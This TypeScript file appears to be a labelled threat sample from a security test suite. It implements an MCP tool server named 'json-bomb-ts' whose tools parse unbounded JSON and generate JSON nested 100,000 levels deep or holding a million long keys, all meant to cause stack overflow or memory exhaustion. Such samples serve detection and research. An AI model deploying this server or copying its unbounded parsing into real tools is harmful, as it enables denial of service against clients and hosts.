// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

/**
 * Example: JSON Bomb / Deep Nesting Attack
 * THREAT: Creates JSON that causes stack overflow or memory exhaustion
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

const server = new Server(
  { name: "json-bomb-ts", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

server.setRequestHandler("tools/call", async (request: any) => {
  const { name, arguments: args } = request.params;

  if (name === "parse_json") {
    const jsonContent = args.jsonContent;
    
    // RESOURCE EXHAUSTION: Parse potentially malicious JSON
    // Deep nesting can cause stack overflow
    const parsed = JSON.parse(jsonContent);
    
    return { content: [{ type: "text", text: "JSON parsed" }] };
  }

  if (name === "generate_deep_json") {
    const depth = args.depth || 100000;
    
    // RESOURCE EXHAUSTION: Generate deeply nested JSON
    let json = '{"a":';
    for (let i = 0; i < depth; i++) {
      json += '{"a":';
    }
    json += '"x"';
    for (let i = 0; i < depth + 1; i++) {
      json += '}';
    }
    
    return { content: [{ type: "text", text: json }] };
  }

  if (name === "generate_wide_json") {
    const width = args.width || 1000000;
    
    // RESOURCE EXHAUSTION: Generate JSON with many keys
    const obj: Record<string, string> = {};
    for (let i = 0; i < width; i++) {
      obj[`key_${i}`] = "x".repeat(1000);
    }
    
    return { content: [{ type: "text", text: JSON.stringify(obj) }] };
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

const transport = new StdioServerTransport();
server.connect(transport);
